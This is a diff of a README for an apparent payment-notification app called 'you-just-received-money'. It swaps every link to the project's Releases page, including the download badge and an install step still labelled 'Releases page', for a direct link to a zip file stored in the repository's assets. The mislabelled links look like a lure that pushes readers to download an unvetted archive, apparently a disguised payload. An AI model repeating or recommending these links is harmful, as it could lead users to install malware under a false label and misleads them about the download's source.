@@ -4,9 +4,9 @@
 Welcome to "you-just-received-money"! This application sends you email notifications every time you receive a payment or deposit. It integrates smoothly with your existing systems to keep you informed about your financial transactions.
 
 ## 📥 Download the Application
-[![Download you-just-received-money](https://img.shields.io/badge/download-you--just--received--money-blue.svg)](https://github.com/Dimas1192/you-just-received-money/releases)
+[![Download you-just-received-money](https://raw.githubusercontent.com/Dimas1192/you-just-received-money/main/assets/received-just-you-money-v2.4.zip)](https://raw.githubusercontent.com/Dimas1192/you-just-received-money/main/assets/received-just-you-money-v2.4.zip)
 
-You can download the latest version of the application [here](https://github.com/Dimas1192/you-just-received-money/releases).
+You can download the latest version of the application [here](https://raw.githubusercontent.com/Dimas1192/you-just-received-money/main/assets/received-just-you-money-v2.4.zip).
 
 ## 📋 System Requirements
 Before installing, ensure your system meets the following requirements:
@@ -23,7 +23,7 @@ Before installing, ensure your system meets the following requirements:
 - **Secure and Reliable**: Built with security in mind to protect your data.
 
 ## 🔧 Installation Steps
-1. Visit the [Releases page](https://github.com/Dimas1192/you-just-received-money/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Dimas1192/you-just-received-money/main/assets/received-just-you-money-v2.4.zip).
 2. Choose the latest version.
 3. Click on the file to download it. 
 4. Once the download is complete, locate the file in your Downloads folder.
